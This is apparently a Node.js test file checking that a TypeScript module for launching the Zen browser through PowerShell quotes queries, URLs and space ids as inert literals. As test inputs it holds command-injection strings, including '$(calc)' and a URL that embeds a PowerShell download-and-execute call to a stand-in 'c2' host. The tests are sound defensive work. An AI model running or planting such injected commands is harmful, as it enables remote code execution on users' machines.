const assert = require("node:assert/strict");
const { readFileSync } = require("node:fs");
const path = require("node:path");
const { test } = require("node:test");
const { runInNewContext } = require("node:vm");
const ts = require("typescript");

function loadModule() {
  const source = readFileSync(path.join(__dirname, "..", "src", "actions", "powershell.ts"), "utf8");
  const { outputText } = ts.transpileModule(source, {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2023 },
  });
  const exports = {};
  runInNewContext(outputText, { exports });
  return exports;
}

const { psLiteral, newTabPowerShellScript, buildSearchTarget, openUrlPowerShellScript, openSpacePowerShellScript } =
  loadModule();

test("psLiteral wraps values in single quotes and doubles embedded single quotes", () => {
  assert.equal(psLiteral("plain"), "'plain'");
  assert.equal(psLiteral("a'b"), "'a''b'");
});

test("new-tab script opens Zen without arguments when there is no query", () => {
  assert.equal(newTabPowerShellScript(undefined), 'Start-Process "zen"');
  assert.equal(newTabPowerShellScript(""), 'Start-Process "zen"');
});

test("new-tab script passes the query as a single-quoted literal", () => {
  assert.equal(newTabPowerShellScript("foo"), 'Start-Process "zen" "-search" \'foo\'');
});

test("new-tab query containing a PowerShell subexpression is not evaluated", () => {
  assert.equal(newTabPowerShellScript("$(calc)"), 'Start-Process "zen" "-search" \'$(calc)\'');
});

test("new-tab query containing double quotes cannot break out of the argument", () => {
  assert.equal(newTabPowerShellScript('a"b'), 'Start-Process "zen" "-search" \'a"b\'');
});

test("new-tab query containing single quotes is doubled inside the literal", () => {
  assert.equal(newTabPowerShellScript("a'b"), 'Start-Process "zen" "-search" \'a\'\'b\'');
});

test("buildSearchTarget percent-encodes the query for an explicit engine", () => {
  assert.equal(buildSearchTarget("https://google.com/search?q=", "foo bar"), "https://google.com/search?q=foo%20bar");
  assert.equal(buildSearchTarget("https://google.com/search?q=", "c# & more"), "https://google.com/search?q=c%23%20%26%20more");
  assert.equal(buildSearchTarget("https://google.com/search?q=", undefined), "https://google.com/search?q=");
});

test("buildSearchTarget returns the bare query for the browser-default engine", () => {
  assert.equal(buildSearchTarget("", "foo bar"), "foo bar");
  assert.equal(buildSearchTarget("", undefined), "");
});

test("open-url script passes the history URL as a single-quoted literal", () => {
  assert.equal(openUrlPowerShellScript("https://example.com/a?b=c"), "Start-Process \"zen\" 'https://example.com/a?b=c'");
});

test("open-url script does not evaluate a subexpression planted in a visited URL", () => {
  assert.equal(
    openUrlPowerShellScript("https://evil.example/$(iex(iwr('http://c2/p')))"),
    "Start-Process \"zen\" 'https://evil.example/$(iex(iwr(''http://c2/p'')))'",
  );
});

test("open-space script passes the space id as a single-quoted literal", () => {
  assert.equal(
    openSpacePowerShellScript("{0c34d9c4-f922-4785-b2b2-61f90f7f9798}"),
    "Start-Process \"zen\" -ArgumentList @(\"--space\", '{0c34d9c4-f922-4785-b2b2-61f90f7f9798}')",
  );
  assert.equal(openSpacePowerShellScript("$(calc)"), "Start-Process \"zen\" -ArgumentList @(\"--space\", '$(calc)')");
});
